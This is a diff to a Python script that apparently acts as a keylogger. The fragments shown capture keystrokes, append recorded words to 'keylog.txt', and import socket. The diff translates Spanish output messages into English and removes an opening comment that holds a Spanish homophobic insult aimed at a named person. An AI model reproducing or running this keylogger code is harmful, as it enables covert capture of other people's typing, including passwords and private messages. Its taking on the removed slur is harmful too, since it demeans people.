@@ -1,5 +1,3 @@
-# marcos puto tocado gay hijo dde pta LA VACA LOLA
-
 import keyboard
 import sys
 import socket
@@ -10,7 +8,7 @@ init()
 
 print(Fore.YELLOW + """
 ==========================================================
-=                      Hecho by:                         =
+=                      Made by:                          =
 =                    dev4lentinho                        =
 ==========================================================
       """)
@@ -36,7 +34,7 @@ def save_word_as_space():
     with open("keylog.txt", "a") as file:
         
         file.write(word + "\n")
-    print(Fore.GREEN + "Palabra registrada: ", word)
+    print(Fore.GREEN + "Registered word:",word)
     reset_word()
 
 def reset_word():
